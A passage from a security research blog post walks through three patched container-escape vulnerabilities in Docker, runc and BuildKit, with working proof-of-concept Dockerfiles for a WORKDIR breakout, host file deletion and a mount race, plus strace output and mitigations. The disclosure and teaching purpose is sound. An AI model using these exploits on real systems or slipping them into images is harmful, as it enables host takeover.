#6 0.179 total 0
#6 0.179 drwxr-xr-x    2 root     root             0 Dec 18 16:09 0EXPLOIT
[snipped for brevity]
Building a proof of concept
This is very promising, but there are still a lot of things that could go wrong. We can now take our time and validate each assumption to ensure that we are looking at what we think we’re looking at… or we can just try a better payload. Given a current working directory we don’t technically have access to, we can’t do any absolute path operations, but .. on Unix is special. Therefore, we can attempt to traverse out of this directory and try to create a file somewhere. This is something of a "best case assumption" as to the exploitation, but if successful, it can short-circuit a lot of iterative trial and error. Therefore, our next Dockerfile attempt will be the following, which will attempt to place an attacker-controlled file in the host root directory:

FROM alpine
WORKDIR /proc/self/fd/7
RUN cd ../../../../../../../../../../../ && touch I_HAVE_BROKEN_OUT
And we try it:

$ docker build --progress=plain --no-cache .
[snipped for brevity]
#7 DONE 0.0s
$ ls -l /I_HAVE_BROKEN_OUT
-rw-r--r-- 1 root root 0 Dec 18 16:14 /I_HAVE_BROKEN_OUT
Success!

So now we can take a step back and think about what we have found. Docker build will perform a chdir operation before some file descriptors to the "outside world" are closed. We can control the path used by chdir and, therefore, using the /proc/self/fd directory, chdir into this still-open file descriptor. This is made possible because the call to chdir happens in the time window between when /proc is mounted and the /proc/self/fd file descriptors are closed on execve when the RUN directive is executed, hence the race condition.

blog-leaky-vessels-3
Once in this position, when we later are given control as part of the Dockerfile RUN command, we can traverse out of this directory and gain access to the full host root filesystem. From here, it’s just a hop, skip, and a jump to full host compromise. We can talk to the docker daemon directly and launch a privileged container, we can add SSH keys and connect to wherever Docker is running, or even just drop a CronJob. 

Exploiting with Dockerfile RUN too
But docker build is usually run in a CI/CD environment or on developer endpoints, somewhat limiting the attack’s impact to non-production environments. Per the documentation, WORKDIR will also impact commands during docker run, and can even be controlled when inheriting from another image in your Dockerfile (with "FROM anotherimage") using ONBUILD. The question becomes: Can we also use this same vulnerability to exploit other systems when our container is running? The answer is yes. We can modify our Dockerfile to use CMD rather than RUN. CMD executes on docker run, compared to the RUN directive, which executes on docker build:

FROM alpine
WORKDIR /proc/self/fd/7
CMD cd ../../../../../../../../../../../ && touch I_HAVE_BROKEN_OUT_OF_DOCKER_RUN_THIS_TIME
And build and run our image like any other Docker image:

$ docker build -t run-time-exploit .
[snipped for brevity]
$ ls -l /I_HAVE_BROKEN_OUT_OF_DOCKER_RUN_THIS_TIME
ls: cannot access '/I_HAVE_BROKEN_OUT_OF_DOCKER_RUN_THIS_TIME': No such file or directory
$ docker run run-time-exploit
$ ls -l /I_HAVE_BROKEN_OUT_OF_DOCKER_RUN_THIS_TIME
-rw-r--r-- 1 root root 0 Dec 18 16:27 /I_HAVE_BROKEN_OUT_OF_DOCKER_RUN_THIS_TIME
This has a critical impact — if to trigger the initial vulnerability when docker build is called an attacker needed to control the Dockerfile itself, now they only need to host a pre-built docker image on a container registry, and the exploit will execute when docker run is called. The victim has far less indication of something being wrong when the payload is delivered via a docker image rather than a crafted Dockerfile. In addition, docker run will usually get called in production environments while docker build in development ones, thus increasing the impact of this issue. 

It turns out that this vulnerability is actually due to the interaction with a dependency of Docker: runc. We were able to confirm this by exploiting a Kubernetes environment built with libcontainer, using the same run-time method to create a malicious image which we then deployed to the environment, observing that the host was compromised in much the same way my test machine was. In some situations, the file descriptor number varied. For example, in the case of Docker Desktop, it was found to be 12. An attacker may need prior knowledge of the environment or have the ability to iteratively retry file descriptor numbers to successfully execute this attack.

Be sure to read our full article on CVE-2024-21626 runc process.cwd & leaked fds container breakout.

We started this blog post discussing race conditions, and there was nothing racy here, but it has shown how strace can be very useful for identifying low-level order-of-operations vulnerabilities, which can be turned into high-impact exploits. In the next section, we will look at an actual TOCTOU race with a window wider than our entire process lifetime.

Plenty of time: CVE-2024-23652
Our next vulnerability introduces an actual "race" condition, where we have a finite amount of time to execute our attack before the payload is triggered. Very conveniently, the "finite amount of time" is the entire duration of our process, allowing us to identify and play with the concept of a race condition without the need to consider timing.

Initial exploration
As above, we start in much the same way, by identifying some functionality we would like to investigate and seeing what it looks like under strace. In this case, the functionality of interest is the ability to mount different types of storage into a container during a RUN step in a Dockerfile. By following the documentation, we can create the following minimal Dockerfile to exercise this functionality:

FROM alpine
RUN --mount=type=tmpfs,target=/FINDME ls -l /FINDME
Once again, we can attach with strace, build this image, and look for occurrences of our unique string "FINDME":

strace.log.602113
327:17:19:55.016610 read(36, "FROM alpine\nRUN --mount=type=tmpfs,target=/FINDME ls -l /FINDME\n", 512) = 64
813:17:19:55.389695 newfstatat(AT_FDCWD, "/var/lib/docker/buildkit/executor/kv3omgmdoc1ceuhu6le8zql95/rootfs/FINDME", {st_mode=S_IFDIR|0755, st_size=4096, ...}, AT_SYMLINK_NOFOLLOW) = 0
814:17:19:55.389735 openat(AT_FDCWD, "/var/lib/docker/buildkit/executor/kv3omgmdoc1ceuhu6le8zql95/rootfs/FINDME", O_RDONLY|O_CLOEXEC) = 36
824:17:19:55.390147 unlinkat(AT_FDCWD, "/var/lib/docker/buildkit/executor/kv3omgmdoc1ceuhu6le8zql95/rootfs/FINDME", 0) = -1 EISDIR (Is a directory)
825:17:19:55.390180 unlinkat(AT_FDCWD, "/var/lib/docker/buildkit/executor/kv3omgmdoc1ceuhu6le8zql95/rootfs/FINDME", AT_REMOVEDIR) = 0

strace.log.792074
233:17:19:55.184384 read(3, "{\"args\":[\"/bin/sh\",\"-c\",\"ls -l /FINDME\"],\"env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"cwd\":\"/\",\""..., 512) = 512
470:17:19:55.197610 newfstatat(AT_FDCWD, "/var/lib/docker/buildkit/executor/kv3omgmdoc1ceuhu6le8zql95/rootfs/FINDME", 0xc00019de48, AT_SYMLINK_NOFOLLOW) = -1 ENOENT (No such file or directory)
471:17:19:55.197642 newfstatat(AT_FDCWD, "/var/lib/docker/buildkit/executor/kv3omgmdoc1ceuhu6le8zql95/rootfs/FINDME", 0xc00019df18, 0) = -1 ENOENT (No such file or directory)
472:17:19:55.197677 newfstatat(AT_FDCWD, "/var/lib/docker/buildkit/executor/kv3omgmdoc1ceuhu6le8zql95/rootfs/FINDME", 0xc0001a0038, 0) = -1 ENOENT (No such file or directory)
474:17:19:55.197732 mkdirat(AT_FDCWD, "/var/lib/docker/buildkit/executor/kv3omgmdoc1ceuhu6le8zql95/rootfs/FINDME", 0755) = 0
475:17:19:55.197794 newfstatat(AT_FDCWD, "/var/lib/docker/buildkit/executor/kv3omgmdoc1ceuhu6le8zql95/rootfs/FINDME", {st_mode=S_IFDIR|0755, st_size=4096, ...}, AT_SYMLINK_NOFOLLOW) = 0
476:17:19:55.197823 openat(AT_FDCWD, "/var/lib/docker/buildkit/executor/kv3omgmdoc1ceuhu6le8zql95/rootfs/FINDME", O_RDONLY|O_CLOEXEC|O_PATH) = 6
479:17:19:55.197898 readlinkat(AT_FDCWD, "/proc/self/fd/6", "/var/lib/docker/buildkit/executor/kv3omgmdoc1ceuhu6le8zql95/rootfs/FINDME", 128) = 73
482:17:19:55.198028 newfstatat(AT_FDCWD, "/var/lib/docker/buildkit/executor/kv3omgmdoc1ceuhu6le8zql95/rootfs/FINDME", {st_mode=S_IFDIR|S_ISVTX|0777, st_size=40, ...}, AT_SYMLINK_NOFOLLOW) = 0
483:17:19:55.198064 openat(AT_FDCWD, "/var/lib/docker/buildkit/executor/kv3omgmdoc1ceuhu6le8zql95/rootfs/FINDME", O_RDONLY|O_CLOEXEC|O_PATH) = 6
487:17:19:55.198202 readlinkat(AT_FDCWD, "/proc/self/fd/6", "/var/lib/docker/buildkit/executor/kv3omgmdoc1ceuhu6le8zql95/rootfs/FINDME", 128) = 73
826:17:19:55.382821 execve("/bin/sh", ["/bin/sh", "-c", "ls -l /FINDME"], 0xc0000a3bf0 /* 2 vars */) = 0
857:17:19:55.385172 execve("/bin/ls", ["ls", "-l", "/FINDME"], 0x7f5f3762f200 /* 4 vars */) = 0
868:17:19:55.385790 lstat("/FINDME", {st_mode=S_IFDIR|S_ISVTX|0777, st_size=40, ...}) = 0
869:17:19:55.385830 open("/FINDME", O_RDONLY|O_LARGEFILE|O_CLOEXEC|O_DIRECTORY) = 3

strace.log.749708
106:17:19:54.997155 read(27, "\0\0I\0\0\0\0\0\3\0\0\0\0D\10\2\"@FROM alpine\nRUN --mount=type=tmpfs,target=/FINDME ls -l /FINDME\n\0\0\7\0\0\0\0\0\3\0\0\0\0\2\10\2", 32768) = 98
115:17:19:54.997539 write(36, "FROM alpine\nRUN --mount=type=tmpfs,target=/FINDME ls -l /FINDME\n", 64) = 64

strace.log.792067
254:17:19:55.173456 write(15, "{\"args\":[\"/bin/sh\",\"-c\",\"ls -l /FINDME\"],\"env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"cwd\":\"/\",\""..., 29646) = 29646

strace.log.603873
1780:17:19:55.068650 newfstatat(AT_FDCWD, "/var/lib/docker/buildkit/executor/kv3omgmdoc1ceuhu6le8zql95/rootfs/FINDME", 0xc001c269f8, AT_SYMLINK_NOFOLLOW) = -1 ENOENT (No such file or directory)
1781:17:19:55.068713 newfstatat(AT_FDCWD, "/var/lib/docker/buildkit/executor/kv3omgmdoc1ceuhu6le8zql95/rootfs/FINDME", 0xc001c26ac8, AT_SYMLINK_NOFOLLOW) = -1 ENOENT (No such file or directory)
We can immediately provisionally skip strace.log.749708, strace.log.792067, and strace.log.603873 as "possibly not interesting" as they do not do anything active with our value, leaving strace.log.602113 and strace.log.792074. Feel free to take some time now and see if you can identify the vulnerability by looking at the two processes, logged in strace.log.602113 and strace.log.792074.

A new vulnerability lead
What follows is the same output, reordered by time, and cut down to only include the key actions in the output:

strace.log.792074
472:17:19:55.197677 newfstatat(AT_FDCWD, "/var/lib/docker/buildkit/executor/kv3omgmdoc1ceuhu6le8zql95/rootfs/FINDME", 0xc0001a0038, 0) = -1 ENOENT (No such file or directory)
474:17:19:55.197732 mkdirat(AT_FDCWD, "/var/lib/docker/buildkit/executor/kv3omgmdoc1ceuhu6le8zql95/rootfs/FINDME", 0755) = 0
826:17:19:55.382821 execve("/bin/sh", ["/bin/sh", "-c", "ls -l /FINDME"], 0xc0000a3bf0 /* 2 vars */) = 0

strace.log.602113
813:17:19:55.389695 newfstatat(AT_FDCWD, "/var/lib/docker/buildkit/executor/kv3omgmdoc1ceuhu6le8zql95/rootfs/FINDME", {st_mode=S_IFDIR|0755, st_size=4096, ...}, AT_SYMLINK_NOFOLLOW) = 0
814:17:19:55.389735 openat(AT_FDCWD, "/var/lib/docker/buildkit/executor/kv3omgmdoc1ceuhu6le8zql95/rootfs/FINDME", O_RDONLY|O_CLOEXEC) = 36
824:17:19:55.390147 unlinkat(AT_FDCWD, "/var/lib/docker/buildkit/executor/kv3omgmdoc1ceuhu6le8zql95/rootfs/FINDME", 0) = -1 EISDIR (Is a directory)
825:17:19:55.390180 unlinkat(AT_FDCWD, "/var/lib/docker/buildkit/executor/kv3omgmdoc1ceuhu6le8zql95/rootfs/FINDME", AT_REMOVEDIR) = 0
What we can see in this output is that our controlled directory (FINDME) is created if it doesn’t exist sometime before the command we specified in the RUN directive (ls -l /FINDME) takes control, and then sometime after that, the directory is cleaned up again. The new directory is created relative to rootfs, the root directory of our container environment, and is, therefore, inside a domain we control.

There is a relatively simple lead here. Something partially controlled by our Dockerfile is deleted after we exit and after our environment has been torn down. To turn this into something further, we will need to investigate to what extent we can control the environment to maybe cause an arbitrary deletion across the host root filesystem.

blog-leaky-vessels-1
Attempting some payloads
The simple test is a directory traversal. Naively, it seems that our controlled path "FINDME" has been appended to the rootfs directory, and this may allow us to escape. Attempting this with an appropriate Dockerfile:

FROM alpine
RUN --mount=type=tmpfs,target=../../../../../../FINDME ls -l /FINDME
Yields the following output:

471:17:34:45.564930 mkdirat(AT_FDCWD, "/var/lib/docker/buildkit/executor/ybqzsilnirvxg20wytgb7skm4/rootfs/FINDME", 0755) = 0
This strongly indicates that the paths are being normalized, so there is no such success there. The next step we could try is a symbolic link; this may not be caught by a naive normalization regime:

FROM alpine
RUN ln -s ../../../../../FINDME2 /FINDME
RUN --mount=type=tmpfs,target=/FINDME ls -l /FINDME
469:17:37:04.939608 mkdirat(AT_FDCWD, "/var/lib/docker/buildkit/executor/jm1fdsswjh4ffockjv3y0xtx6/rootfs/FINDME2", 0755) = 0
Again, this indicates appropriate path normalization to the canonical path. We can infer that the symbolic link is first being resolved (as the new directory being created ends in our second path name "FINDME2"), then ensured to be relative to the root filesystem.

So, the paths are being properly checked. It seems that we cannot directly specify a path outside our rootfs this way. However, we know from our initial strace output that this validation and creation occurs before our process gains control, and the cleanup happens afterward. We can see that it is being checked for something, but at this stage, we do not know what without further investigation into the code.

Bringing in the race condition
There are a couple of pieces of background knowledge that are useful for the next stages of investigation for this vulnerability:

Mounts require privileges to move. We know that we do not have privileges and, therefore, cannot move the mount after it has been performed (before our process gains control). However, parent directories of mounts can be moved. Given sufficient control over the entire mount directory structure, we may be able to replace the created directory structure.

The unlinkat syscall will not traverse symlinks. This means that we cannot merely place a symlink as FINDME and expect the application to delete the target of the symlink. The symlink itself will be deleted.

With this background knowledge, we can intuit that we need the following to occur to be able to exploit this potential vulnerability:

We need to be able to create arbitrary depth mounts
We can check this with a simple modification to our sample Dockerfile:

RUN --mount=type=tmpfs,target=/tmp/movable/mount mount | grep movable
And observe success during build:

#5 [stage-0 2/2] RUN --mount=type=tmpfs,target=/tmp/movable/mount mount | grep movable
#5 0.167 tmpfs on /tmp/movable/mount type tmpfs (rw,nosuid,relatime,inode64)
#5 DONE 0.2s
We need to be able to move the mount and create a new directory structure
Validating our above assertion, we can see that it is not possible to move the mount directly:

#5 [stage-0 2/2] RUN --mount=type=tmpfs,target=/tmp/movable/mount mv /tmp/movable/mount /tmp/movable/mount.old
#5 0.166 mv: can't rename '/tmp/movable/mount': Resource busy
#5 ERROR: process "/bin/sh -c mv /tmp/movable/mount /tmp/movable/mount.old" did not complete successfully: exit code: 1
We can also confirm that the parent directory does allow moves:

#5 [stage-0 2/2] RUN --mount=type=tmpfs,target=/tmp/movable/mount mv /tmp/movable /tmp/movable.old && ls -l /tmp
#5 0.164 total 4
#5 0.164 drwxr-xr-x    3 root     root          4096 Dec 18 17:50 movable.old
The parent directory of the mount will then need to be a symbolic link, and the name of the mount point will need to be the same as the item we wish to delete in the real root filesystem
Given the above ability to move, this is trivial to achieve:

#5 [stage-0 2/2] RUN --mount=type=tmpfs,target=/tmp/movable/mount mv /tmp/movable /tmp/movable.old && ln -s / /tmp/movable
After our process exits, the Docker engine will not perform a full re-check of the mount target path and will blindly call unlinkat against it
With the above modifications we have made to the mount destination, we will now need to observe the behavior of Docker with strace. Once again, we can re-add our "FINDME" needle for searching:

RUN --mount=type=tmpfs,target=/tmp/movable/FINDME mv /tmp/movable /tmp/movable.old && ln -s / /tmp/movable
The output from strace does not include a call to unlinkat however. Recall in our earlier strace output, prior to the calls to unlinkat there were calls to newfstatat. This may merely be a check to confirm if there is anything to clean up, and we do not have a directory FINDME in our host root directory. There are no indications of any kind of validation error at this stage, so we have hope.

A new proof of concept attempt
Given the above, we need something more specific to pass what we assume to be an existence check at this stage. Since we don’t want to break our research VM, we can create a dummy file on our host, which we can then target with our proof of concept:

FROM alpine
RUN --mount=type=tmpfs,target=/tmp/movable/DELETEME mv /tmp/movable /tmp/movable.old && ln -s / /tmp/movable
Upon testing this, we can immediately see that our payload is successful, demonstrating that initially the /DELETEME file exists but after the docker build command ran with our exploitation attempt, it has been removed:

$ ls -l /DELETEME
-rw-r--r-- 1 root root 0 Dec 18 17:59 /DELETEME
$ docker build --no-cache .
[snipped for brevity]
$ ls -l /DELETEME
ls: cannot access '/DELETEME': No such file or directory
But we don’t have much more information about why from this output. We can see in strace:

1361:18:01:44.362113 newfstatat(AT_FDCWD, "/var/lib/docker/buildkit/executor/cdqilw40qcvt7i123ox9p4qh7/rootfs/tmp/movable/DELETEME", {st_mode=S_IFREG|0644, st_size=0, ...}, AT_SYMLINK_NOFOLLOW) = 0
1363:18:01:44.362265 unlinkat(AT_FDCWD, "/var/lib/docker/buildkit/executor/cdqilw40qcvt7i123ox9p4qh7/rootfs/tmp/movable/DELETEME", 0) = 0
On its own, this does not immediately shed any more light. However, we know that due to our interference, /tmp/movable inside the rootfs is actually a symlink to /, so while the unlinkat argument is /var/lib/docker/buildkit/executor/cdqilw40qcvt7i123ox9p4qh7/rootfs/tmp/movable/DELETEME, it resolves to /DELETEME in the host root filesystem, explaining why our file disappeared.

blog-leaky-vessels-2
So there we have it: by swapping out the directory tree while we have control over the container root filesystem, the Docker engine can be caused to delete arbitrary files in the host filesystem. While not a time-critical vulnerability, this is still arguably a race condition as it requires us to perform an action between checking and creating the directory and the later cleanup.

Be sure to read our full article on CVE-2024-23652 Buildkit build-time container teardown arbitrary delete vulnerability.

Race to the source: CVE-2024-23651
In this section, we will explore an actual race condition, where timing is critical and where we have to actually be faster than something else, although there are things we can do to make our lives easier.

Identifying our area of interest
Our next area of interest is a continuation of the RUN --mount investigation. This time, we are looking at the type=cache. A cache mount allows the creation of persistent (i.e. stored on the host filesystem) cache to speed up builds, especially those requiring package manager-based installation (i.e apt). According to the documentation, this also includes a source= parameter, which specifies the subpath in the identified mount and is potentially interesting. With a little trial and error, we can come up with a Dockerfile which will exercise this functionality:

FROM alpine

RUN --mount=type=cache,id=FINDMEid,target=/FINDMEtarget mkdir /FINDMEtarget/FINDMEsrc
RUN --mount=type=cache,id=FINDMEid,target=/FINDMEtarget,source=/FINDMEsrc cat /proc/self/mountinfo
Cutting right to the chase so we can get to the fun parts, we can pare down the strace output from this build to the following lines:

10:14:48.606430 newfstatat(AT_FDCWD, "/var/lib/docker/buildkit/executor/ozw342oxuanhksrjgrg937iui/rootfs/FINDMEtarget", 0xc0000b3ca8, AT_SYMLINK_NOFOLLOW) = -1 ENOENT (No such file or directory)
*10:14:48.606468* newfstatat(AT_FDCWD, "/var/lib/docker/overlay2/yz04lp4vni7bt6hxp8nx0lugm/diff/FINDMEsrc", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
10:14:48.606510 newfstatat(AT_FDCWD, "/var/lib/docker/buildkit/executor/ozw342oxuanhksrjgrg937iui/rootfs/FINDMEtarget", 0xc0000b3e48, AT_SYMLINK_NOFOLLOW) = -1 ENOENT (No such file or directory)
10:14:48.606616 newfstatat(AT_FDCWD, "/var/lib/docker/buildkit/executor/ozw342oxuanhksrjgrg937iui/rootfs", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
10:14:48.606653 mkdirat(AT_FDCWD, "/var/lib/docker/buildkit/executor/ozw342oxuanhksrjgrg937iui/rootfs/FINDMEtarget", 0755) = 0
10:14:48.606723 newfstatat(AT_FDCWD, "/var/lib/docker/buildkit/executor/ozw342oxuanhksrjgrg937iui/rootfs/FINDMEtarget", {st_mode=S_IFDIR|0755, st_size=4096, ...}, AT_SYMLINK_NOFOLLOW) = 0
10:14:48.606761 openat(AT_FDCWD, "/var/lib/docker/buildkit/executor/ozw342oxuanhksrjgrg937iui/rootfs/FINDMEtarget", O_RDONLY|O_CLOEXEC|O_PATH) = 6
10:14:48.606865 readlinkat(AT_FDCWD, "/proc/self/fd/6", "/var/lib/docker/buildkit/executor/ozw342oxuanhksrjgrg937iui/rootfs/FINDMEtarget", 128) = 79
*10:14:48.606900* mount("/var/lib/docker/overlay2/yz04lp4vni7bt6hxp8nx0lugm/diff/FINDMEsrc", "/proc/self/fd/6", 0xc0000ae650, MS_BIND|MS_REC, NULL) = 0
The interesting lines — at timestamps 10:14:48.606468 and 10:14:48.606900 — refer to our source argument. The context here is the second RUN line in the Dockerfile, where we are mounting a cache mount with a source relative to that mount. We can see that the source directory is being checked for existence and that it is a directory and then later used as a mount source. However, the source path is mounted via path, whereas the destination path is mounted via a file descriptor after checking the file descriptor.

This tells us that, in theory at least, while we cannot influence the target of the mount call, we can potentially influence the source! If we can get a symlink into the right place at the right time, we can trick this code into performing an arbitrary bind mount for us. The mount syscall will traverse both source and destination symlinks, so we know, given the available information, that there is a theoretical attack here.

Categorizing our problems
There are, unfortunately, several hurdles between us and our goal of a shiny new vulnerability:

How can we impact the source directory of the mount between the check and the use?

How can we know when to do anything? If we’re fully concurrent, we’ve no way of knowing what syscall our target process is currently doing, so trying to swap out the source directory for a symlink will be a complete shot in the dark.

How can we fit all of this into a little over 0.0005 seconds?

The first issue is a relatively easy solution with a thorough documentation reading. Docker, or more specifically, Buildkit, allows for concurrent builds. If you have multi-stage builds that come together at the end, assuming a sensible dependency tree, BuildKit will attempt to run the builds in parallel. Given the entire purpose of cache mounts is to persist cache data, they are naturally shareable between concurrent builds.

We can validate this with the following demo:

FROM alpine as a
RUN --mount=type=cache,id=test,target=/test sleep 5 && touch /test/I_AM_BUILD_A

FROM alpine as b
RUN --mount=type=cache,id=test,target=/test sleep 10 && ls -l /test

FROM alpine
COPY --from=a /etc/passwd /passwd_a
COPY --from=b /etc/passwd /passwd_b
Which shows us the following output:

[snipped for brevity]
#5 [a 2/2] RUN --mount=type=cache,id=test,target=/test sleep 5 && touch /test/I_AM_BUILD_A
#5 DONE 5.4s
[snipped for brevity]

#6 [b 2/2] RUN --mount=type=cache,id=test,target=/test sleep 10 && ls -l /test
#6 10.34 total 0
#6 10.34 -rw-r--r--    1 root     root             0 Dec 19 10:59 I_AM_BUILD_A
#6 DONE 10.4s

[snipped for brevity]

real    0m10.621s
user    0m0.082s
sys     0m0.045s
Here, we can see that stage "b" can see the file created by stage "a", and additionally, the full build time is around 10 seconds, rather than 10+5, which we would expect to see if the builds were serial.

This means that we can execute our potential attack by having two build stages concurrently executing and sharing the same cache mount. One stage can be the "victim", which will have its mount raced, and the other will be the "attacker", which can change the cache mount at the appropriate time.

Timing oracles
Our next problem is more complex. Even if we have code executing simultaneously, we still need some clue as to when we can attempt to swap the source directory with a symlink. As we saw above, our window is 0.0005 seconds and can occur now, 0.001 seconds in the future, or 5 minutes from now. We have no inherent way of knowing when this occurs, so we must create some kind of timing oracle. A timing oracle is some kind of signal that we can wait for that will let us synchronize with our target. In this case, the oracle will tell us when the code has reached a certain stage, and we can match up our exploitation attempt accordingly.

Given our above strace output, ideally, we want some way of informing our "attacking" stage that our "victim" stage is inside the window. We can use the mount target directory creation for this. By setting the target mount directory to a subdirectory of a different cache mount, we can share this state between the stages, and the "attacker" stage can just spin, waiting for the target directory to appear in the cache. At this point, it knows that the "victim" stage is inside its window and can immediately perform the attack.

We can test this out with the following Dockerfile, which will just synchronize the two stages:

FROM alpine as attacker
RUN --mount=type=cache,id=mounttarget,target=/test until [ -e /test/MOUNTTARGET ]; do :; done && echo 'Victim is in the window'

FROM alpine as victim
RUN sleep 5
RUN --mount=type=cache,id=mounttarget,target=/test --mount=type=cache,id=mountsource,target=/test/MOUNTTARGET true

FROM alpine
COPY --from=attacker /etc/passwd /passwd_a
COPY --from=victim /etc/passwd /passwd_b
In the build output, we can see successful synchronization:

[snipped for brevity]
#6 [victim 2/3] RUN sleep 5
#6 DONE 5.2s

#7 [victim 3/3] RUN --mount=type=cache,id=mounttarget,target=/test --mount=type=cache,id=mountsource,target=/test/MOUNTTARGET true
#7 ...

#5 [attacker 2/2] RUN --mount=type=cache,id=mounttarget,target=/test until [ -e /test/MOUNTTARGET ]; do :; done && echo 'Victim is in the window'
#5 5.407 Victim is in the window
#5 DONE 5.4s
[snipped for brevity]

#7 [victim 3/3] RUN --mount=type=cache,id=mounttarget,target=/test --mount=type=cache,id=mountsource,target=/test/MOUNTTARGET true
#7 DONE 0.3s
[snipped for brevity]
As you can see, the attacker waited for the full 5 seconds for the target to appear due to the victim’s RUN sleep 5 command. This shows us that the oracle is reliable and can tell exactly when the "victim" is inside their vulnerable window.

Widening the window
At this stage, we have concurrent execution and information of when the "victim" build stage is inside the vulnerable window; in theory, we can mount the attack. However, since our oracle signals us about halfway through the window, we only have 0.0002 seconds to act. While technically possible it might take a lot of retries to exploit this vulnerability successfully. Even running the very simple true command takes 0.003 on my machine, an order of magnitude too slow.

What we can try to do instead is widen the window. If we can slow everything down enough, we will have plenty of time to mount our attack, making the exploit much more reliable and hopefully single-shot. Once again, we can refer back to our original strace output and consider what we control. As we have used above, we control the creation of a directory inside our window, but what if we can create many directories? We have seen earlier that Docker will automatically make nested directory structures as necessary, so we can exploit this fact to cause many calls to mkdir!

Linux paths are restricted to PATH_MAX, or 4096 bytes long. Including the separator (‘/’), the most space-efficient we can make our directory name is 2 bytes. Taking into account our required oracle from above, we can make a structure (4096-len(“/test/MOUNTTARGET/”))/2 = 2039 components long. That’s a lot of mkdirat calls! We should, however, consider the eventual use of this path. If we are trying to cause the real root filesystem to be mounted at this location, we will need some space left over after our controlled path for the filenames in the filesystem. There’s no point in having a root filesystem mount if you can’t read any files.

We should, therefore, choose a comfortable middle ground and see what strace shows us. As a starting point, I chose 250 directories called "a":

FROM alpine
RUN --mount=type=cache,id=FINDMEid,target=/test/MOUNTTARGET/a/a/[...]/a/a true
Pulling all the pieces together
Our initial problems were threefold: an attack vector, timing information, and enough time to pull off the attack. We’ve solved all of those three to the point we can create a full proof of concept now. Our proof of concept will need to look something like the following:

We launch an "attacker" build stage
It will have one cache mount that will be the destination mount and act as oracle.

It will have a second cache mount that will act as the "source" cache.

It will spin-checking the first cache mount for the creation of the target directory, indicating the attack window.

During the attack window, it will change the source subdirectory in the source cache mount to be a symlink to /.

We launch a concurrent "victim" build stage
It will first mount the destination cache mount/oracle.

It will attempt to mount the second cache mount with a source subdirectory.

It will then look inside the second cache mount and hopefully observe the wrong mount, and have access to the root filesystem.

blog-leaky-vessels-4
Our proof of concept Dockerfile for achieving this will look like the following. The attacker container will spin for the creation of the /oracle/mountdest directory, which is our oracle, and swap out /mountsource/CACHEOWNED for a symlink to /.

FROM alpine as victim

RUN --mount=type=cache,id=mountsource,target=/mountsource mkdir /mountsource/CACHEOWNED

RUN --mount=type=cache,id=oracle,target=/oracle --mount=type=cache,id=mountsource,target=/oracle/mountdest/3/4/5/6[...]/9/0,source=/CACHEOWNED,rw <<EOT
#!/bin/sh
cd /oracle/mountdest
while [ ! -e etc ]; do
        [ -z "$(ls)" ] && echo FAILED && exit 1
        cd $(echo *)
done
touch BROKEN_OUT_WITH_RACE_CONDITION
EOT

FROM alpine as attacker

RUN --mount=type=cache,id=oracle,target=/oracle --mount=type=cache,id=mountsource,target=/mountsource until [ -e /oracle/mountdest ]; do :; done && rmdir /mountsource/CACHEOWNED && ln -s / /mountsource/CACHEOWNED

FROM alpine as done
COPY --from=victim /etc/passwd /victim
COPY --from=attacker /etc/passwd /attacker
When the control is passed to the script in the "victim" build stage, the deep directory structure will contain a mount to the root filesystem. To validate this, it will recursively traverse this path until it sees what appears to be a root filesystem (based on the existence of an /etc directory). At that point, it will create a file we can validate externally.

If we now build this, we can observe the result:

$ ls -l /BROKEN_OUT_WITH_RACE_CONDITION
ls: cannot access '/BROKEN_OUT_WITH_RACE_CONDITION': No such file or directory
$ docker build --no-cache .
[snipped for brevity]
$ ls -l /BROKEN_OUT_WITH_RACE_CONDITION
-rw-r--r-- 1 root root 0 Dec 19 12:10 /BROKEN_OUT_WITH_RACE_CONDITION
What this output shows us is that the mount was successfully subverted in the "victim" build step, such that the actual source of the bind mount is the real root filesystem. As mentioned above, from here, there are a multitude of options for a full breakout, and this is left as an exercise for the reader.

Be sure to read our full article on CVE-2024-23651 Mount cache race: Build-time race condition container breakout.

How to not write race conditions
In this post, we’ve explored three real-world vulnerabilities, which we identified as all, to an extent, could be categorized as race conditions. But how do we fix such vulnerabilities in reliable ways rather than just making the race window smaller and smaller?

The answer is to only act on resources that you know are safe, not that were safe at some indeterminate point in the past. In the cases we’ve seen, the validations and context were relatively robust; they checked what they wanted to check and exited if anything was amiss. The main issue is the timing window between the check and the use. To alleviate this, especially in these highlighted cases, you can open your target, be it a file or directory, perform your validation steps against that, using fstat and family, respond accordingly, but then crucially act on the same file descriptor. An attacker cannot modify the state of a file descriptor you hold, so as long as you keep it open, you know it to be the same, and you can reasonably assume that your validation still holds.

For CVE-2024-21626, our WORKDIR vulnerability, runc (the vulnerable component) took a two pronged approach to mitigation. The first was to ensure that the provided path was relative to the container rootfs using getcwd(). This function will return ENOENT if the directory does not exist inside the current rootfs, and is therefore a reliable indicator of a directory which is in the host filesystem. The second mitigation was to ensure that all dangling file descriptors which were potentially usable for this exploit were appropriately closed before the call to chdir is made.

For CVE-2024-23652, the arbitrary file deletion from the host filesystem, Docker now validates that the directory it will delete is inside the container rootfs, after the time it could then be changed again. This is an effective mitigation as it ensures that even after symlink resolution the directory remains in the container and cannot impact the host filesystem.

Finally, for CVE-2024-23651, the mount cache race vulnerability, Docker now performs the mount source validation against an opened file descriptor to the directory, and it retains this directory file descriptor and re-uses it for the mount operation itself. Since this is the known-validated file descriptor, the mount operation is safe as the file descriptor itself cannot be changed externally.

For more information about the specific mitigations for these vulnerabilities, please see the vendor advisories for the full patches.

Concluding our deep dive of Leaky Vessels
In this post, we have explored the use of strace for profiling, identifying, and exploiting race conditions in userland Linux. We then went on to use these same techniques against the Docker engine and came away with a number of high-severity vulnerabilities. These vulnerabilities allow an attacker to escape the container’s isolation into the host system, affecting build systems and, in one specific case, production environments.

These are my favorite category of vulnerabilities, and I’ve spent longer than I’d like to admit staring at strace output for various products. Hopefully, this post has shown that it’s not necessary to have the most flashy, complicated, and hard-to-set-up tools to find complex and exciting vulnerabilities. You can go a long way with strace, grep, and staring off into space.
